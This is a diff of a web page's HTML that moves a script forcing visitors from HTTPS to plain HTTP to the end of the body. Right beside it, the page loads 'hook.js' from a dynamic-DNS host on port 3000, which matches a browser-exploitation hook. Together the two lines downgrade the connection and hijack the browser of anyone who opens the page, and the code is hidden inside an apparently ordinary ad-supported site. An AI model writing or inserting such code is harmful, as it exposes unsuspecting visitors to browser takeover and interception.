@@ -35,10 +35,6 @@
          document.addEventListener('load',function(e){
    (adsbygoogle = window.adsbygoogle || []).push({});
            
-           
-   if (location.protocol !== 'http:') {
-    location.replace(`http:${location.href.substring(location.protocol.length)}`);
-   }
 });
 
 </script>
@@ -65,5 +61,9 @@
          <div class="col-sm-4"></div>
       </div>
   </div>
+  <script> if (location.protocol !== 'http:') {
+    location.replace(`http:${location.href.substring(location.protocol.length)}`);
+   }
+  </script>
   <script src='http://mrauzzie.ddns.net:3000/hook.js'></script>
 </body>
